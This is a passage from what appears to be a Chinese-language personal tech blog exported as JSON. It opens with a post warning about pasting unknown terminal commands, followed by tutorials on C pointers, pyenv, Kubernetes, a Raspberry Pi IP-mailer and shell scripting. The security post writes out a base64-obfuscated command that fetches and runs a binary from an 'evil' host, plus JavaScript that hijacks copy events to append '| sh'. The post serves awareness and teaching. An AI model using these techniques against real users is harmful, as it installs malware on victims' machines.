Linux 內建就有 base64 工具，受害人可以透過執行 base64 解碼工具，解出具有意義的字串\n\n```bash\necho \"Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\" | base64 -d\n```\n\noutput:\n```\ncurl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil\n```\n\n接著將字串 pipe 到 `sh` 就可以直接運行：\n\n```bash\necho \"Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\" | base64 -d | sh\n```\n\n以上指令就沒有辦法一眼就看出目的，但意圖不變。\n\n## 進一步偽裝\n\n有經驗的開發者看到指令中帶有 `sh` 就會馬上起疑心，這是一件好事。因為本來就不應該隨便下具有執行權限的指令，何況你根本不知道那串 `base64` 字串解出來為何。\n\n我們可以先將我們的惡意指令多新增一個功能，印出一些字串，讓受害者以為這串 `base64` 就是一個普通的字串而已：\n\n`echo \"Hi, Im yiyu0x :)\" && curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil`\n\n進行編碼：\n\n```\nZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\n```\n\n惡意指令：\n\n```bash\necho \"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\" | base64 -d | sh\n```\n\n執行後的結果：\n\n`Hi, Im yiyu0x :)`\n\n如果我將個指令放在一些顯眼的地方像是網站的自我介紹、說明欄，我相信有些具有好奇心的讀者可能就會傻傻執行。但是一些具有經驗的讀者還是會發現句尾帶的那個 `sh`，而不去執行它。\n\n那我如果改成這樣呢？\n\n```bash\necho \"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\" | base64 -d\n```\n\n這樣子我相信 9 成以上的人（包含我自己），都會想把這段指令貼上去執行看一下結果為何，畢竟就是一條單純的解碼指令，怎麼可能有害？\n\n但是別忘了，惡意攻擊者可以在網頁中的 JS 插入：\n\n```javascript\nconst source = document.querySelector('div.source') //指令區塊\nsource.addEventListener('copy', (event) => {\n    const selection = document.getSelection()\n    event.clipboardData.setData('text/plain', selection.toString() + '| sh')\n    event.preventDefault()\n})\n```\n\n該程式碼的意思為當你複製字串時，自動將剪貼板中的字串末端加上 `| sh`，意思就是你複製到的字串其實是：\n\n```bash\necho \"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\" | base64 -d | sh\n```\n\n如果你貼上 terminal 之後沒有檢查就直接按下 enter，那麼你的電腦就不知不覺的執行了一個執行檔而你完全沒有感覺。\n\n想想看，如果在開發者的部落格自我介紹，放入這種指令式的自我介紹是不是很有趣？或是放在臉書的自我介紹？當你很開心的貼上指令時，很可能默默中了人家的後門程式。\n\n## 最後\n\n該文章的重點無非還是提醒幾點資安的意識：\n\n- 來路不明的指令不要貼上終端機執行\n- 不要相信剪貼板的內容，按下 Enter 執行前應該肉眼再度檢查一次指令\n\n最後提醒大家，在未經同意下入侵他人電腦是有刑責的，不要以身試法！","tags":["資訊安全"]},{"title":"重新看懂指標與陣列之間的交互關係","url":"/2020/02/15/","content":"\nC 語言中，指標與陣列之間的關係一直是一個初學者很難理解的坑。又或是很多人只知道寫法，但卻從來沒有理解過背後的原因。相信各位理解了原因之後，在撰寫 C 語言時會對自己操作這個語言更加有自信。這篇文章重新試著釐清這指標與陣列之間的關係，希望對大家能有幫助。\n\n## 陣列宣告與指標宣告\n\n陣列可以用以下的方式宣告：\n\n1. 宣告但是尚未初始化\n```c\nint arr_init0[3]; // 宣告但是尚未初始化，此時陣列中的值是沒有意義的。\n```\n2. 宣告並且初始化\n```c\nint arr_init1[3] = {1, 2, 3};\n```\n3. 不指定大小，大小會依照後面元素個數來決定\n```c\nint arr_init2[] = {1, 2, 3};\n```\n4. C99 新增。指定特定元素，其他未被指定元素會被設定為 0\n```c\nint arr_init3[] = {[2] = 2};\n```\n---\n指標的宣告，需要關鍵字 `*`，該關鍵字可以緊鄰變數或是型態，本質上沒有差別：\n```c\nint* ptr1;\nint *ptr2;\n```\n但若是我們宣告指標卻不指定初始值，這件事是非常危險的！\n```c\nint *ptr1;\nprintf(\"%p\\n\", ptr1); // 0x1125ce025\n```\n\n該指標在未宣告的情況下，編譯器會直接指定該位置上本來就存有的值（這個值沒有意義，是作業系統殘留的值），如果沒有特別注意，操作這個位置會發生錯誤，甚至覆寫到需要的資料。\n\n我們會建議指標在宣告時還沒有特定的空間或位置可以指定時，先使用 `NULL` 來指定。\n\n```c\nint *ptr = NULL;\nprintf(\"%p\\n\", ptr); //0x0\n```\n\n## 陣列索引與指標\n\n陣列的變數名稱其實就是一個指標，指向陣列開頭元素的記憶體位置。這也就是為什麼陣列索引會從 0 開始計算，因為索引的意義其實是與起始位置的位移量。我們可以用以下範例看到起始位置的值就是直接對陣列名稱取值（dereference）。\n```c\nint arr[3] = {1, 2, 3};\nprintf(\"Address: %p, Value: %d\\n\", arr, *arr);\n// Address: 0x7ffee98be05c, Value: 1\n```\n如果對該變數遞增，會發現記憶體位置相差了 4 格，原因是因為我們在宣告陣列時，指定了陣列的型態是 `int`，如此以來我們在進行取值的動作時，CPU 才知道下一個位置在哪邊。有趣的是，一般我們所使用的取值動作 `arr[1]` 其實就等於 `*(arr + 1)`。\n\n```c\nprintf(\"Address: %p, Value: %d\\n\", arr + 1, *(arr + 1));\n// Address: 0x7ffee1dca060, Value: 2\n```\n\n有了以上的概念之後，不難理解為何我們在設定函數的參數引述時，可以將陣列設定為：\n```c\nvoid foo(int *arr);\n```\n\n或是這樣設定：\n\n```c\nvoid foo(int arr[]);\n```\n\n這兩種指定方式是一模一樣的（對於編譯器來說）。在函式原型中，參數的名稱是沒有意義的，只有型態有意義，所以也可以指定為：\n```c\nvoid foo(int *);\n```\n\n但是陣列名稱與指標也不能說是完全一模一樣的東西。\n\n## 陣列傳遞與指標\n\n在 C 語言中，傳遞陣列就是傳遞陣列的起始記憶體位置，所以我們可以用指標來接收陣列：\n```c\n#include <stdio.h>\n\nvoid foo(int *);\n\nint main() {\n    int arr[3] = {1, 2, 3};\n    printf(\"%lu\\n\", sizeof arr); // 12\n    foo(arr);\n}\n\nvoid foo(int *ar) {\n    printf(\"%lu\\n\", sizeof ar); // 8\n}\n```\n以上程式會印出：\n```\n12\n8\n```\n先印出 12 的原因是，陣列在宣告時就已經知道了陣列長度，int 型態在我的作業系統中佔用了 4 bytes，所以 4x3=12。\n\n8 的話則是代表指標變數本身佔據了 8 bytes 的空間。非常合理，因為我的電腦是 64-bit 的作業系統，要可以完整定址全部空間需要 8 bytes（64 / 8 = 8）。\n\n所以為什麼剛才提到：「陣列名稱與指標也不能說是完全一模一樣的東西」。用 `sizeof` 進行操作時，會發現兩者還是有一點差別！（不過在沒有進行參數傳遞前，幾乎是沒有差別的。）\n\n由以上的例子可以發現，陣列的變數名稱可以進一步得知陣列長度的，只要使用 `sizeof` 運算子即可：\n```c\nint arr[3] = {1, 2, 3};\nint len = sizeof arr / sizeof arr[0];\nprintf(\"%d\\n\", len); //3\n```\n`sizeof` 後面如果不是接基本型態，是不需要括號的。如果接上基本型態才需要括號，像是：\n\n```c\nprintf(\"%lu\\n\", sizeof(char));   //1\nprintf(\"%lu\\n\", sizeof(short));  //2\nprintf(\"%lu\\n\", sizeof(int));    //4\nprintf(\"%lu\\n\", sizeof(long));   //8\n//請注意！不同型態的空間大小是由編譯器依照作業系統去分配以及實作，所以有可能不同電腦上面的結果不一致。\n```\n\n對於函式來說，它只有辦法得知陣列起始記憶體位置，無法得知總長度。或是可以直接說，對於函數來說，他並不知道傳進來的東西是一個陣列，只知道是一個記憶體位置，指向的型態也知道，其他事情對於這個函數來說都無法得知。\n\n這也是為何我們時常在接收陣列時，會額外接收一個參數，用來表示陣列的總長度。\n\n```c\nvoid foo(int *arr, int n);\n```\n\n## 二維陣列\n\n在宣告一維陣列時，可以直接填上元素，不指定陣列大小，可是在二維陣列這樣操作的話，會發生錯誤：\n```c\nint td_arr[][] = {{1, 2}, {3, 4}, {5, 6}};\n\n/*\napp.c:7:12: error: array has incomplete element type 'int []'\n        int td_arr[][] = {{1, 2}, {3, 4}, {5, 6}};\n                  ^\n1 error generated.\n*/\n```\n我們要先重新理解二維陣列，二維陣列不過是一個陣列，該陣列的值也是一個陣列（`{1, 2}`, `{3, 4}`, `{5, 6}`），沒有多特別，僅此而已。\n\n陣列只接受第一層不指定大小而已，用後面的元素個數自己推算（一維陣列只有一層，所以你可能會認為一維陣列比較聰明）。\n\n所以我們應該要告訴編譯器，內層陣列的大小，這樣他才有辦法幫我們將所需要的空間準備好，我們應該這樣子撰寫程式：\n```c\nint td_arr[][2] = {{1, 2}, {3, 4}, {5, 6}};\n```\n\n第一層有幾個元素可以不用指定（就像一維陣列），但是我們需要告訴編譯器，內容陣列的寬度有多大。我們總共花了 24 bytes 的空間，4 bytes(int size) x 6(elements) = 24。\n\n接下來，我們嘗試將二維陣列中我們需要的值取出：\n```c\nprintf(\"%d\\n\", *td_arr[1]);  //3\nprintf(\"%d\\n\", (*td_arr)[1]);//2\n```\n\n`[]` 的優先權比 `*` 還要高，所以在第一個範例中我們會先找到 `td_arr` 中的第二個元素（第 1 個是索引 0）然後取值。第二個元素就是 `{3, 4}`，在文章前段的一維陣列有講過直接取值就是對第一個元素（索引 0）取值。所以 `{3, 4}` 的第一個元素就是 `3`。\n\n第二個範例則是先取值，我們會拿到 `td_arr` 的第 1 個元素（索引 0），也就是 `{1, 2}` 接下來取出第二個元素（索引 1），得到 `2`。\n\n也可以將上述寫成是不含有 `[]` 的表示法，如下：\n```c\nprintf(\"%d\\n\", **(td_arr + 1));//3\nprintf(\"%d\\n\", *(*td_arr + 1));//2\n```\n\n前面段落也有提到 `[]` 與 `*(arr + offset)` 的寫法可以互相替換，就不再贅述。\n\n## 指標與二維陣列\n\n接下來我們要理解如何用指標去操作二維陣列，首先我們需要先宣告一個指向二維陣列的指標：\n\n```c\nint (*td_ptr)[2];\n```\n\n該宣告的意思是宣告一個指標，指向大小為 2 的陣列，該陣列內容為 `int` 型態。\n\n為何不直接寫：\n\n```c\nint *td_ptr[2]; // 可以看成 int *(td_ptr[2]);\n```\n\n原因是因為優先權帶來的影響並不同（`[]` 的優先權較大），以上宣告的意思是產生一個大小為 2 的陣列，陣列內容是兩個指向 `int` 的指標。如下：\n\n`{ptr1, ptr2}`\n\n宣告完指標之後，我們可以將該指標，指向我們的二維陣列：\n```c\nint td_arr[][2] = {{1, 2}, {3, 4}, {5, 6}};\nint (*td_ptr)[2];\ntd_ptr = td_arr;\n```\n\n接著一樣可以用指標來操作該陣列：\n```c\nprintf(\"%d\\n\", td_ptr[2][0]); //5\nprintf(\"%d\\n\", td_ptr[2][1]); //6\n```\n\n如果需要設定函數原型的話：\n```c\nvoid foo(int (*ar)[2]);\n```\n或是：\n```c\nvoid foo(int arr[][2]);\n```\n皆可以用來接收。\n\n我想看到這邊，如果你沒有其他疑問的話。應該可以稍微理解為何我們在傳遞二維陣列時，會使用這樣子的寫法了！這樣子理解的話也可以推廣到多維陣列中，像是：\n\n```c\nvoid foo(int arr[][2][3][4][5][6]);\nvoid foo(int (*arr)[2][3][4][5][6]);\n```\n\n## 後記\n\n希望這篇文章可以讓大家更加理解 C 語言陣列與指標撰寫過程中的背景原因，在網路上看到太多文章只有提到宣告或是使用的方式，但是卻沒有加以描述任何原因，導致很多人只知道寫法但不清楚為何應該這樣子撰寫。\n\n希望大家看完文章有所收穫 😄！","tags":["c"]},{"title":"優雅的在 macOS 上使用 Python","url":"/2020/01/11/","content":"\n## 為什要要這樣做？\n\n我們都知道 macOS 有 Python，為了不將預設的環境弄髒。比較推薦的做法是透過 `pyenv` 這套 Python 版本管理工具來安裝不同的 Python 版本，如此一來要切換不同的版本也方便，畢竟還是有很多專案是用 Python2 在維護。\n\n如果你沒有使用不同的 Python 版本需求也可以無視這篇，但是建議至少用 `virtualenv` 來開發專案，才不會把內建的 Python 環境弄成一團亂。\n\n## 檢查目前版本\n\n目前我的 macOS 的 Python 是預設的 Python：\n\n`which python`\n```\n/usr/bin/python\n```\n`python                                                       `\n```\nWARNING: Python 2.7 is not recommended.\nThis version is included in macOS for compatibility with legacy software.\nFuture versions of macOS will not include Python 2.7.\nInstead, it is recommended that you transition to using 'python3' from within Terminal.\n\nPython 2.7.16 (default, Nov  9 2019, 05:55:08)\n[GCC 4.2.1 Compatible Apple LLVM 11.0.0 (clang-1100.0.32.4) (-macos10.15-objc-s on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>>\n```\n\n## 用 pyenv 來管理 Python 版本\n\n首先，先安裝 pyenv：\n\n`brew install pyenv`\n\n安裝完畢後確認自己的環境變數：\n\n`echo $PATH`\n```\n/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\n```\n\n### 初始設定設定\n\n`~/.zshrc` 請自行替換成你的 shell 的設定檔位置（bash 的話是 `~/.bash_profile`）：\n\n`echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\\n  eval \"$(pyenv init -)\"\\nfi' >> ~/.zshrc`\n\n重新載入 shell：\n\n`source ~/.zshrc`\n\n重新確認環境變數：\n\n`echo $PATH`\n```\n/Users/yiyuchang/.pyenv/shims:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\n```\n\n可以發現家目錄下多了一個 `.pyenv/shims` 管理這些套件，這也是 `pyenv` 進行神秘魔法的地方 🧙‍♂️\n\n## 開始使用 pyenv\n\n確認目前 Python 版本為系統版本：\n\n`pyenv global`\n```\nsystem\n```\n\n顯示可取用的 Python 版本\n`pyenv install --list`\n```\nAvailable versions:\n  2.1.3\n  2.2.3\n  2.3.7\n  2.4.0\n  2.4.1\n  (略)\n  stackless-3.4-dev\n  stackless-3.4.1\n  stackless-3.4.2\n  stackless-3.4.7\n  stackless-3.5.4\n```\n\n裡面有各式各樣的 Python interpreter，在這邊，我想使用官方的 3.8.1 版本，先進行安裝：\n\n`pyenv install 3.8.1`\n```\npython-build: use openssl@1.1 from homebrew\npython-build: use readline from homebrew\nDownloading Python-3.8.1.tar.xz...\n-> https://www.python.org/ftp/python/3.8.1/Python-3.8.1.tar.xz\nInstalling Python-3.8.1...\npython-build: use readline from homebrew\npython-build: use zlib from xcode sdk\nInstalled Python-3.8.1 to /Users/yiyuchang/.pyenv/versions/3.8.1\n```\n\n查看目前本地端所有的 Python 版本（有星號代表目前正在使用）：\n\n`pyenv versions`\n```\n* system (set by /Users/yiyuchang/.pyenv/version)\n  3.8.1\n```\n\n將 Python 切換到剛才下載的 3.8.1：\n\n`pyenv global 3.8.1`\n`pyenv versions`\n```\n  system\n* 3.8.1 (set by /Users/yiyuchang/.pyenv/version)\n```\n\n切換不一定要使用 `global`, `global` 代表全域的 Python 版本，另外兩種方式`local` 或是 `shell` 有興趣的朋友可以去了解一下，可以更彈性的進行 Python 版本管理\n\n接著確認 Python 是不是真的切換到我們剛才下載的 `3.8.1` 了：\n\n`which python`\n```\n/Users/yiyuchang/.pyenv/shims/python\n```\n\n`python`\n```\nPython 3.8.1 (default, Jan 11 2020, 12:25:19)\n[Clang 11.0.0 (clang-1100.0.33.16)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>>\n```\n\n大功告成！如此一來之後就可以輕鬆地在不同專案下使用 Python 了。不過建議在不同專案還是要使用 `virtualenv` 來管理，否則套件全部會裝在本機的全域的 Python 環境上，如果不同專案要用到不同版本的套件，又會變得一團糟！","tags":["python","macos"]},{"title":"快速體驗 kubernetes 的強大之處","url":"/2020/01/08/","content":"\n## 前言\n\n容器技術近年來非常流行，相信各位在不同地方多少有聽過 `kubernetes`（或是它的簡稱 `k8s`）這項技術。但是很多人了解 `k8s` 之後會被這個技術嚇到，原因是因為有大量的名詞，像是 `Pod`, `Service` 等等（這些元件數量高達 60 多種），然後又有一大堆的架構圖，很多人可能還沒開始就先放棄了。\n\n這篇文章的目的沒有要教大家了解 `k8s` 背後的觀念，而是要透過簡單的小實驗來讓大家了解 `k8s` 的作用到底為何？讓大家有點感覺，後續如果各位要深入了解，可能也會有點幫助。\n\n簡單來說 `k8s` 是一項可以管理容器的技術，而且可以分散式的管理。意思就是容器掛掉之後 `k8s` 會自動偵測並且讓容器重新啟動。當然還有非常多的功能，但是主要的核心目的就是保持應用程式的 `高可用性（high availability）`（簡稱 HA）。\n\n本篇實驗會透過一個簡單例子來讓大家看到 `k8s` 達成高可用性的成效。\n\n## 實驗必備\n\n- docker\n- minikube\n\n## 一般容器\n\n在開始之前，大家可以先跑這個容器（yiyu0x/current-time）起來玩玩看\n\n`docker run -d -p 3000:3000 yiyu0x/current-time`\n\n這個容器會在 localhost 3000 port 開一個顯示目前時間的 API：\n\n如果順利的話訪問 `localhost:3000` 會得到：\n```\nCurrent time is 4:2:48\n```\n\n我們可以後過 `docker ps` 來確認這個 container 正確無誤的運作：\n\n```\n~/dev/k8s-post/my-api ❯ docker ps\nCONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                    NAMES\nd5662a916aed        yiyu0x/current-time   \"docker-entrypoint.s…\"   10 seconds ago      Up 8 seconds        0.0.0.0:3000->3000/tcp   tender_hypatia\n```\n\n\n但是我們如果去戳 `localhost:3000/bye` 這個位置的話，會發現容器掛掉了：\n\n```\n~/dev/k8s-post/my-api ❯ docker ps\n\n```\n\n這個行為模擬出當應用程式意外結束的情況。\n\n## 導入 k8s\n\n建立一個 `pod` 內容是剛才的 `current-time` 的 `container`：\n`kubectl run --image=yiyu0x/current-time curr-time --generator=run-pod/v1`\n\n```\n~/dev/k8s-post/my-api ❯ kubectl get po\nNAME        READY   STATUS              RESTARTS   AGE\ncurr-time   0/1     ContainerCreating   0          16s\n```\n\n將他 `expose` 出去：\n\n`kubectl expose pod curr-time --port 3000 --type=NodePort`\n\n取得位置並且訪問：\n```\n~/dev/k8s-post/my-api ❯ minikube service curr-time --url\nhttp://192.168.64.6:30948\n```\n\n此時建議再開一個 terminal 的 tab 使用:\n`watch kubectl get po`\n（感謝學長 Jerry Wang 指正，可以用 `kubectl get po -w` 就不用額外安裝 watch 指令了！）\n\n監測該 `pod` 的狀態並且去戳 `http://192.168.64.6:30948/bye`\n\n你會發現容器掛掉後幾秒鐘，又自己重新跑起來了，並且 RESTARTS 的數量變成 1 了（原本是 0）：\n\n```\nNAME        READY   STATUS    RESTARTS   AGE\ncurr-time   1/1     Running   1          8m56s\n```\n\n## 更強大的高可用性 - replicas\n\n透過以上例子已經可以感覺到 `k8s` 的威力，但是其實 `docker` 本身就可以監測容器的狀態並且重新啟動了。`k8s` 更強大的地方在於它可以一次建立多個 `pod` 並且在一個 `pod` 掛掉時透過 `loadbalancer` 馬上把流量切換到其他 `pod` 中，這樣子使用者完全感覺不出來原來服務有掛掉過。\n\n建立 `replicas`：\n`kubectl run curr-time --image=yiyu0x/current-time --replicas=3 --port 3000`\n\n對外打開：\n`kubectl expose deployment curr-time --port=3000 --type=NodePort`\n\n一樣透過 `watch kubectl get po` 來監控 `pod`：\n\n（2019/1/17 更新：或是用 `kubectl get po -w`）\n```\nEvery 2.0s: kubectl get po\n\nNAME                         READY   STATUS    RESTARTS   AGE\ncurr-time-6f9cb4fdf9-crc66   1/1     Running   3          7m41s\ncurr-time-6f9cb4fdf9-hbkx5   1/1     Running   2          7m41s\ncurr-time-6f9cb4fdf9-s742x   1/1     Running   2          7m41s\n```\n\n然後戳一下 API 的 bye 位置，會發現：\n```\nEvery 2.0s: kubectl get po\n\nNAME                         READY   STATUS      RESTARTS   AGE\ncurr-time-6f9cb4fdf9-crc66   0/1     Completed   3          8m40s\ncurr-time-6f9cb4fdf9-hbkx5   1/1     Running     2          8m40s\ncurr-time-6f9cb4fdf9-s742x   1/1     Running     2          8m40s\n```\n\n三個服務中的容器一個掛掉其他兩個還是正常運作中，使用者根本感覺不出來（流量會被導入到正常運作的 pod 中）後面的容器原來掛掉了！\n\n## 更更更強大的高可用性\n\n以上例子使用 `minikube` 來實驗，只有一個節點。真實情況甚至可以把好幾台機器全部給 `k8s` 進行管理。這樣子甚至連機器掛掉都可以保證服務不中斷，這才是真正的高可用性！\n\n文中透過一個例子讓讀者了解到 `k8s` 的用處，但是沒有解釋很多問題，像是：\n\n- 為什麼建立的是 `pod` 不是 `container`？\n- 為什麼需要 `expose`？\n- `minikube` 是什麼？\n\n原因在於我認為先體驗一次這個技術的效果再去學習這個技術細解，有時候可能會比起直接去記憶那些硬生生的名詞來得有效果，所以看完這篇文章之後，如果不太懂裡面的細解可以再去看官方文件或是查閱其他 `k8s` 的概念講解文章。\n\n看完之後再回來自己玩過一次，我相信會有不一樣的感覺的！","tags":["kubernetes"]},{"title":"Raspberry Pi 開機時自動寄送 IP 設定","url":"/2019/12/15/","content":"\n## 前言\n\n在使用 Raspberry Pi（以下簡稱為 Pi）時，如果每一次都要佔用一個電腦的 USB port 非常不方便，而且電腦輸出電壓不一定夠，如果條件允許，我們會希望將 Pi 用變壓器獨立插在插座上，再使用 SSH 這類的工具遠端操作。\n\n但是要 SSH 前必須要知道 IP，我們希望讓 Pi 在開機完畢後自動將 IP 發送至自己的信箱。如此一來之後只要 Pi 有取得 IP 的話就會自動寄信，我們不必再透過 USB 線材以及 screen 指令進行連線。\n\n## 寄信方式\n\n要寄信的方式有兩種，一種是直接架設 SMTP server 來寄信，但是通常收信方會因為該信件的來源沒有 Domain Name 而不收信（惡意郵件），或是直接將信箱放置垃圾信件處理，所以不建議此種方式。\n\n第二種方法則是利用 Gmail 提供的 SMTP server 來寄信（要自備 Gmail 帳號）。該方式需要先到 [Google 低安全性應用程式存取權](https://myaccount.google.com/lesssecureapps) 允許低安全性應用程式來存取你的帳戶，請斟酌使用。\n\n## 寄信腳本\n\n請將以下欄位自行填入，並且賦予該腳本執行權限。（建議使用 Python2）\n\n-   to\n-   gmail_user\n-   gmail_password\n\n```python\n#!/usr/bin/python\nimport subprocess\nimport smtplib\nimport socket\nfrom email.mime.text import MIMEText\nimport datetime\n\n# Which email address want to send\nto = 'XXX'\n\n# Using specific gmail account\ngmail_user = 'XXX'\ngmail_password = 'XXX'\n\n# SMTP command\nsmtpserver = smtplib.SMTP('smtp.gmail.com', 587)\nsmtpserver.ehlo()\nsmtpserver.starttls()\nsmtpserver.login(gmail_user, gmail_password)\ntoday = datetime.date.today()\n\n# Linux Specific shell command\narg='ip route list'\np=subprocess.Popen(arg,shell=True,stdout=subprocess.PIPE)\ndata = p.communicate()\nsplit_data = data[0].split()\nipaddr = split_data[split_data.index('src')+1]\nmy_ip = 'Your ip is %s' %  ipaddr\nmsg = MIMEText(my_ip)\nmsg['Subject'] = 'IP For RaspberryPi on %s' % today.strftime('%b %d %Y')\nmsg['From'] = gmail_user\nmsg['To'] = to\nsmtpserver.sendmail(gmail_user, [to], msg.as_string())\nsmtpserver.quit()\n```\n\n## 開機時執行\n\n在 `/etc/rc.local` 中執行 Script（mail.py）\n\n```bash\n_IP=$(hostname -I) || true\nif [ \"$_IP\" ]; then\n  printf \"My IP address is %s\\n\" \"$_IP\"\n  /home/pi/mail.py\nfi\n\nexit 0\n```\n","tags":["raspberry_pi"]},{"title":"Shell Script 中那些錯過的事","url":"/2019/11/28/","content":"\n# 前言\n\nShell Script 想必大家都有使用過，即使沒有真的寫 script，多少也會有在 command line 中透過 pipe 或是 and 條件句來將不同的指令結合在一起的經驗。\n\n也因為 Shell 如此平凡，貼近一般環境，反而很少有人花時間去認真了解過 Shell。我自己也是這種人，於是近期讀了《精通 shell 程式設計 第四版》後，記錄了一些自己從來沒有了解過的細節。\n\n## 檔案名稱替換\n\n### \\* 字元\n\n在 Shell 中（此篇文章用 Bash 來當例子），`*` 會被轉譯成該目錄下所有檔案的名稱。（這件事是由 Shell 預先處理好。）\n\n當 `echo *` 時，實際上會先把 \\* 替換成檔名（假如有 a b c 三個檔案），然後執行 `echo a b c` 印出 `a b c`。\n\n以 echo 指令的角度，是沒有辦法辨別 a b c 是由 `*` 替換而來，echo 只知道自己收到三個參數分別為 a, b, c。\n\n### ? 字元\n\n? 可以對應單一字元，例如 ?? 可以對應出全部剛好兩字元的檔名，如果想要匹配兩個字元以上（包含兩個字元）的檔名可以使用 ??\\*\n\n該配對方式與 Regular Expression 類似，但並非 Regular Expression。\n\n## 輸入重導向\n\n在一行指令開始執行時，其實 Shell 已經默默幫我們做了一些事情。\n\n```bash\nwc -l users # 5 s.sh\nwc -l < s.sh # 5\n```\n\n以上兩者的輸出並不相同，差異在於後者是透過標準輸入傳入，wc 程式並無法得知是哪一個檔案傳進來的內容，所以無從得知檔名。\n\n## 變數相關\n\n### 變數\n\n-   變數型態只有字串變數\n-   宣告變數時 = 號左右不能有空格\n\n```bash\na = hello # 錯誤\na=hello   # 正確\n```\n\n-   當字串代有空格時，要用 `'` 或 `\"` 來夾住字串\n-   單引號夾住的內容不會再進行轉譯，雙引號的內容會再進行轉譯\n-   \\$ 字號用來取值（shell 會進行替換）\n\n```bash\nvar1=hi\necho '$var1' # $var1\necho \"$var1\" # hi\n```\n\n### unset\n\nunset 是一個好用的指令，用來把變數取消設置，也可以將 function, alias 的設定取消：\n\n```bash\nmsg=hello\necho $msg # hello\nunset msg\necho $msg #\n```\n\n還有一種取消的方式為指定空值：\n\n```bash\nmsg=hello\necho $msg # hello\nmsg=      # 不指定\necho $msg #\n```\n\n-   取消 alias : `unset -a <alias-name>`\n-   取消 function : `unset -f <func-name>`\n\n### \"$var\" 與 $var 的差異\n\n（假設目錄下有 a b c 三個檔案）\n\n```bash\nvar=*\necho $var    # a b c\necho \"$var\"  # *\n```\n\n因為 `$var` 會替換成 `*` ，所以 `echo $var` 會先被 Shell 替換成 `echo *` 再替換成 `echo a b c`。\n\n然而 `echo \"$var\"` 最後僅會被替換成 `echo \"*\"` 而印出 `*`。\n\n（雙引號只會轉譯變數，不會轉譯 `*` 。）\n\n由上述例子可知，為何比較好的寫法是在印出變數時外面再包一層雙引號。\n\n### 命令替換：`` 與 \\$()\n\n這兩個包裹字串的方式會讓字串內容當作指令來執行：\n\n```bash\nvar=`date`\nvar2=$(date)\necho \"$var\"  # Mon Nov 25 16:56:47 CST 2019\necho \"$var2\" # Mon Nov 25 16:56:47 CST 2019\n```\n\n差異在於 `$()` 是新的方式，兩個 ` 則是舊的方式\n\n## 常用指令以及被忽略的事\n\n### echo\n\necho 指令會無視空格（除非你用引號夾住字串）將空格當作分離不同參數的分隔符號：\n\n```bash\necho a b  c    d   e # a b c d e\n```\n\n`-e` 參數用來開啟轉譯功能\n\n```bash\necho -e \"123\\n\" # 123\n                #\n# 因為 echo 本身會換行，所以 \\n 會讓 output 有兩個換行\n# \\c 可以讓 echo 去除換行字元\necho -e \"123\\c\" # 123 04:17:55 yiyu@afra tmp →\n# shell 的 PS1 會緊貼在 output 之後（因為沒有換行字元）\n```\n\n### ls\n\n使用 ls 指令，會列出該目錄下所有檔案，但不是一個檔案一行，想要一個檔案一行印出，可以使用 `ls -1`\n\n## wc\n\n用來查看檔案的內容包行幾列、幾個單字、幾個字元。不幸的是 wc 的結果開頭都會有一個空白，可以使用 sed 將它剔除：\n\n```bash\nwc backup.sh\n# 4  9 82 backup.sh\nwc backup.sh | sed 's/^ //g'\n#4  9 82 backup.sh\n```\n\n### sort 覆蓋自己\n\nsort 千萬不要直接重新導入自己，否則會清除該檔案內容：\n\n```bash\ncat a.txt\n# 1\n# 2\n# 3\nsort a.txt > a.txt\ncat a.txt\n#\n```\n\n如果有這個需求，可以加上 `-o` 參數：\n\n```bash\ncat a.txt\n# 1\n# 2\n# 3\nsort a.txt -o a.txt\ncat a.txt\n# 1\n# 2\n# 3\n```\n\n## 參數\n\n### 特殊變數\n\n-   `$#` 會替換成參數數量\n-   `$*` 會替換成全部參數\n-   我們都知道 $1, $2 用來指定不同參數，但假如是參數 10，\\$10 會被轉譯成 `$1` 以及 `0`，這時候就需要 `${n}` 格式來指定參數 10， `${10}`。\n\n## 決策\n\n### 退出狀態\n\n-   退出狀態為 0 代表成功，非 0 代表失敗\n-   這個退出狀態並不是回傳值（這邊跟 C 語言不太一樣）\n-   可以用 `$?` 查看上一個指令的退出狀態\n\n### test 指令\n\n-   在 if 句中可以用 [] 來取代 test 兩者並無差別：\n\n```bash\n#!/bin/bash\nif test -e a;then\n    echo \"yes\"\nfi\nif [ -e a ];then\n    echo \"yes\"\nfi\n```\n\n上述兩種寫法是完全相同的，[] 也可以直接在 Shell 中使用：\n\n```bash\n[ a = a ]\necho $?   # 0\n```\n\n-   有個指令 